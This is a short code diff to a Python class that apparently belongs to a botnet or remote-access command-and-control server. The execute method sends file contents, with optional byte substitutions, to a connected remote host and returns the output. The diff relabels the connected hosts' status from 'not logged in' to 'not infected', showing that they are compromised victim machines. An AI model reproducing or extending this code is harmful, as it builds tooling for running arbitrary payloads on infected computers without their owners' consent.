@@ -50,7 +50,6 @@ class User:
 
     @classmethod
     def from_dict(cls, data):
-        logging.info(data)
         user = cls(
             uuid=data.get('uuid'),
             ip=data.get('ip'),
@@ -63,23 +62,27 @@ class User:
         )
         return user
     
-    async def execute(self, file_path):
+    async def execute(self, file_path, replacements={}):
         if not self.is_logged_in():
-            logging.error(f"User {self.ip} is not logged in")
+            logging.error(f"User {self.ip} is not infected")
             return {
-                "error": "User is not logged in"
+                "error": "User is not infected"
             }
         with open(file_path, "rb") as f:
             logging.info(f"Executing {file_path} on {self.ip}")
+            content = f.read()
+            for key, value in replacements.items():
+                content = content.replace(key.encode(), value)
             self.writer.write(b'print("pause")')
             async with self.lock:
-                self.writer.write(f.read())
+                logging.info(f"Lock acquired on {self.ip}")
+                self.writer.write(content)
 
                 await self.writer.drain()
             
                 output = await self.reader.read(4096)
 
-                logging.info(f"Output: {output.decode()}")
+                logging.info(f"Output for {self.ip}: {output.decode()}")
                 return output.decode()
     
     def is_logged_in(self):
